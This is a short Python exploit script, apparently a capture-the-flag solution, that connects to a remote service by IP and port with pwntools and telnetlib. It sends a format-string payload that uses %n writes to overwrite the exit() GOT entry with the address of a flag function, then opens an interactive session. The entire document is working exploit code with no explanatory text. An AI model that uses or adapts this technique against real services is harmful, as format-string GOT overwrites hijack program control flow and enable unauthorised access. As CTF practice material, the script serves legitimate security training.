from telnetlib import Telnet
from struct import pack
from pwn import *

p=Telnet('103.157.96.13',7781)
#p=Telnet('10.0.2.15',5555)

flag = 0x80491c2 # 0x91c2 = 37314 0x10804=67588 - 37314 = 30274
exit_got = 0x804c01c

def pading(s):
    return s+"X"*(576-len(s))

buf = ""
buf+=p32(exit_got)
buf+=p32(exit_got+2)    
buf+="AAAAAAAA"                                      
buf+="%4$37298x"
buf += "%4$n"
buf += "%30274x"
buf += "%5$n"

print p.read_until("Ketik Nama anda : ")
p.write(pading(buf)+'\n')  
p.interact()